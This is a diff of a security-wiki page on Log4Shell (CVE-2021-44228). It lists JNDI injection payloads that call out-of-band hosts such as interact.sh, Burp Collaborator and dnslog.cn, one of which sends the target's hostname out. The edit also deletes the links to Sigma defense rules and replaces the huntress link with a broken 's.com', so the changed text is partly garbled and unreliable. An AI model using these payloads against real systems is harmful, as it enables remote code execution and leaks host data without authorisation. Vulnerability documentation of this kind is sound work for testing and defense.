@@ -116,7 +116,7 @@ Therefore, the only thing needed to get RCE a **vulnerable version of Log4j proc
 
 ### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**
 
-This vulnerability is a critical **untrusted deserialization flaw** in the `log4j-core` component, affecting versions from 2.0-beta9 to 2.14.1. It allows **remote code execution (RCE)**, enabling attackers to take over systems. The issue was reported by Chen Zhaojun from Alibaba Cloud Security Team and affects various Apache frameworks. The initial fix in version 2.15.0 was incomplete. Sigma rules for defense are available ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).
+This vulnerability is a critical **untrusted deserialization flaw** in the `log4j-core` component, affecting versions from 2.0-beta9 to 2.14.1. It allows **remote code execution (RCE)**, enabling attackers to take over systems. The issue was reported by Chen Zhaojun from Alibaba Cloud Security Team and affects various Apache frameworks. The initial fix in version 2.15.0 was incomplete.
 
 <br>
 
@@ -160,7 +160,7 @@ This vulnerability is very easy to discover if unprotected because it will send 
 - `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (using [interactsh](https://github.com/projectdiscovery/interactsh))
 - `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (using Burp Suite)
 - `${jndi:ldap://2j4ayo.dnslog.cn}` (using [dnslog](http://dnslog.cn))
-- `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` using (using [huntress](https://log4shell.huntress.com))
+- `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` using (using [huntress](s.com))
 
 Note that **even if a DNS request is received that doesn't mean the application is exploitable** (or even vulnerable), you will need to try to exploit it.
 
